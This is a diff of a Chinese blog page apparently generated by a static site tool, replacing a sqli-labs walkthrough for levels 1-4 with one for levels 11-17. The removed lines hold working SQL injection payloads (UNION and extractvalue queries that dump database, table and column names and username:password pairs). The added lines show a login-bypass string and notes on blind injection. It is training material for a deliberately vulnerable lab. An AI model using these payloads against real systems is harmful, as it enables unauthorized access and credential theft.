@@ -152,47 +152,46 @@
 
         <div id="main" >
             <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
-                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >sqli-labs（一）</h2></a>
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >sqli-labs(三)</h2></a>
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h1><p>本篇文章运用的注入语句已在sqli基础中说明，故运用时不再解释原因。</p>
-<h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><ol>
-<li><code>?id=1 and 1=2 --+</code>若返回结果正常，说明不是数字类型；</li>
-<li><code>?id=1&#39; --+</code> 显示不正常,<code>?id=1&#39;) --+ </code>显示正常时，该类型为字符注入，且以(‘’)的方式闭合字符串，还有(“”)类似。</li>
-</ol>
-<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h4 id="法一：UNION联合查询注入"><a href="#法一：UNION联合查询注入" class="headerlink" title="法一：UNION联合查询注入"></a>法一：UNION联合查询注入</h4><ol>
-<li>用and 1=2测试 ，页面回显正常，所以该地方不是数值查询。</li>
-<li>尝试在id后面加上’，页面回显不正常，可能存在SQL字符注入。</li>
-<li>用–+将sql后面的语句注视掉后，页面回显正常，则证明这个地方是单引号字符型注入</li>
-<li>使用order by 语句判断有几列数据；order by 3页面回显正常，order by 4页面回显不正常，说明此表一个有3列。</li>
-<li>将id=1改为一个数据库不存在的id值，如-1（当用id=1的时候执行的结果只有一条记录，因为在 index.php 中并没有循环取出数据，<strong>故让第一行查询的结果是空集，union右边的查询结果自然就成为了第一行</strong>，打印在网页上了，id一般是数字，从1开始自增的，可把id值设为非正数（负数或0），浮点数，字符型或字符串）使用union select 1,2,3联合查询语句查看页面是否有显示位。<img src="/2020/11/08/sqli/11.jpg" alt="11"></li>
-</ol>
-<p>输出结果说明页面有2个显示位。</p>
-<p>6.用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息。</p>
-<p><strong>查询数据库名:</strong></p>
-<p> <code>union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><img src="/2020/11/08/sqli/12.jpg" alt="12"></p>
-<p><strong>查询所有表名:</strong></p>
-<p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code><img src="/2020/11/08/sqli/13.jpg" alt="13"></p>
-<p><strong>查列名：</strong></p>
-<p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
-<p><img src="/2020/11/08/sqli/14.jpg" alt="14"></p>
-<p><strong>查询用户名，密码:</strong></p>
-<p><code>union select 1,group_concat(username,0x3a,password),3 from users --+</code></p>
-<p><img src="/2020/11/08/sqli/15.jpg" alt="15"></p>
-<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><h4 id="法二：报错型注入"><a href="#法二：报错型注入" class="headerlink" title="法二：报错型注入"></a>法二：报错型注入</h4><p>因less1-4的步骤类似，故报错型注入以less3为例。</p>
-<p>输入单引号报错，输入 –+后仍报错，故不是简单的单引号报错；输入<code>?id=1&#39;) --+ </code>回显示正常，则证明less-3属于以(‘’)的方式闭合字符串。</p>
-<p><strong>爆表</strong></p>
-<p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</code></p>
-<p><img src="/2020/11/08/sqli/16.jpg" alt="16"></p>
-<p><strong>爆列</strong></p>
-<p><code>and%201=extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%20--+</code><img src="/2020/11/08/sqli/17.jpg" alt="17"></p>
-<p><strong>爆值</strong><br> <code> and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+</code></p>
-<p><img src="/2020/11/08/sqli/18.jpg" alt="18"></p>
-<p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;I-kill-you&#39;))))--+</code></p>
-<p><img src="/2020/11/08/sqli/19.jpg" alt="19"></p>
-<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p><code>?id=1 and 1=2 --+</code>回显不正常，判断为数字型注入，把第一题中id=1后面的单引号去掉，其它保持不变。</p>
-<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>输入单引号不报错，<code>?id=1&#39;)</code>也不报错<code>?id=1&quot;)</code>报错，加上<code>--+</code>后回显正常，故为与(“”)的方式闭合字符串类型；方法类似。</p>
+                <h1 id="sqli-labs-三"><a href="#sqli-labs-三" class="headerlink" title="sqli-labs(三)"></a>sqli-labs(三)</h1><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>less-11为post注入，post就是数据从客户端提交到服务器端,输入用户名和密码会以表单的形式提交到服务器进行验证。</p>
+<h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h4><p>用之前的1无反应，试着使用常用的管理员密码账户 admin(Dumb也行)，成功登录；加单引号注入，密码随意，报错。</p>
+<p><img src="/2020/11/22/sqli-labs%E4%B8%89/1.jpg" alt="1"></p>
+<p>根据报错可以判断出该处为单引号注入，使用万能密码<code>admin&#39;or&#39;1&#39;=&#39;1#</code>（or ‘1’=’1恒成立，所以语句恒真）将其注释；回显正常，确定为单引号注入。</p>
+<h4 id="2-爆库名"><a href="#2-爆库名" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p>用<code>union select 1,database()-- #</code>查询，语句放在用户名或密码都可以。</p>
+<p><img src="/2020/11/22/sqli-labs%E4%B8%89/2.jpg" alt="2"></p>
+<h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p>接下来步骤与前面关卡类似</p>
+<p><img src="/2020/11/22/sqli-labs%E4%B8%89/3.jpg" alt="3"></p>
+<h4 id="4-爆字段"><a href="#4-爆字段" class="headerlink" title="4.爆字段"></a>4.爆字段<img src="/2020/11/22/sqli-labs%E4%B8%89/4.jpg" alt="4"></h4><h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值<img src="/2020/11/22/sqli-labs%E4%B8%89/5.jpg" alt="5"></h4><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>试探出该处为双引号闭合注入，其余步骤类似。</p>
+<h2 id><a href="#" class="headerlink" title></a><img src="/2020/11/22/sqli-labs%E4%B8%89/6.jpg" alt="6"></h2><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探<img src="/2020/11/22/sqli-labs%E4%B8%89/7.jpg" alt="7"></h4><p>查询源代码可知该关卡登录成功只返回图片不返回结果；因此可采用布尔盲注或时间盲注。</p>
+<h4 id="2-爆库名-1"><a href="#2-爆库名-1" class="headerlink" title="2.爆库名"></a>2.爆库名<img src="/2020/11/22/sqli-labs%E4%B8%89/8.jpg" alt="8"></h4><h4 id="3-爆表-1"><a href="#3-爆表-1" class="headerlink" title="3.爆表"></a>3.爆表<img src="/2020/11/22/sqli-labs%E4%B8%89/9.jpg" alt="9"></h4><p>接下去与less-6提到的报错步骤相似，不再赘述。</p>
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><h4 id="1-试探-2"><a href="#1-试探-2" class="headerlink" title="1.试探"></a>1.试探<img src="/2020/11/22/sqli-labs%E4%B8%89/10.jpg" alt="10"></h4><p>其余与上述关卡类似。</p>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><h4 id="1-试探-3"><a href="#1-试探-3" class="headerlink" title="1.试探"></a>1.试探</h4><p>本关可以使用布尔盲注或时间注入。</p>
+<p><img src="/2020/11/22/sqli-labs%E4%B8%89/11.jpg" alt="11"></p>
+<p><strong>注意</strong>:&amp;passwd=1不能少，因为后台源码中设置uname和passwd这两个参数任何一个都不能为空，一旦其中一个为空将不会执行SQL语句</p>
+<p><img src="/2020/11/22/sqli-labs%E4%B8%89/15.jpg" alt="15"></p>
+<h4 id="2-爆库名-2"><a href="#2-爆库名-2" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p>库名：</p>
+<p><img src="/2020/11/22/sqli-labs%E4%B8%89/16.jpg" alt="16"></p>
+<p>之后语句皆与less-8一样。</p>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16<img src="/2020/11/22/sqli-labs%E4%B8%89/12.jpg" alt="12"></h2><p>其余与15关类似。</p>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>先看源代码</p>
+<p><img src="/2020/11/22/sqli-labs%E4%B8%89/18.jpg" alt="18"></p>
+<p>uname用check_input()函数进行了处理，只截取15个字符；</p>
+<p>get_magic_quotes_gpc()用于判断解析用户提示的数据，特别是post、get、cookie过来的数据增加转义字符“\”。</p>
+<p>stripslashes()删除由 addslashes() 函数添加的反斜杠</p>
+<p>ctype_digit()判断是不是数字，是数字就返回true，否则返回false</p>
+<p>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>intval()   整型转换一系列过滤过于麻烦，故从password注入。</p>
+<h4 id="1-试探-4"><a href="#1-试探-4" class="headerlink" title="1.试探"></a>1.试探</h4><p><img src="/2020/11/22/sqli-labs%E4%B8%89/19.jpg" alt="19"></p>
+<p>确定为单引号注入。</p>
+<h4 id="2-爆库名-3"><a href="#2-爆库名-3" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p>之前报错试过updatexml，这关试看看floor()和extractvalue()。</p>
+<p>floor()：比较麻烦</p>
+<p><img src="/2020/11/22/sqli-labs%E4%B8%89/20.jpg" alt="20"></p>
+<p>extractvalue()：与updatexml相似</p>
+<p><img src="/2020/11/22/sqli-labs%E4%B8%89/21.jpg" alt="21"></p>
+<p>其余步骤不再赘述。</p>
 
             </div>
 
@@ -255,8 +254,8 @@ $('.btn_click_load').click(function() {
 -->
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'http://liquor-boop.github.io/2020/11/08/sqli/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'http://liquor-boop.github.io/2020/11/08/sqli/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://liquor-boop.github.io/2020/11/22/sqli-labs%E4%B8%89/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://liquor-boop.github.io/2020/11/22/sqli-labs%E4%B8%89/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 
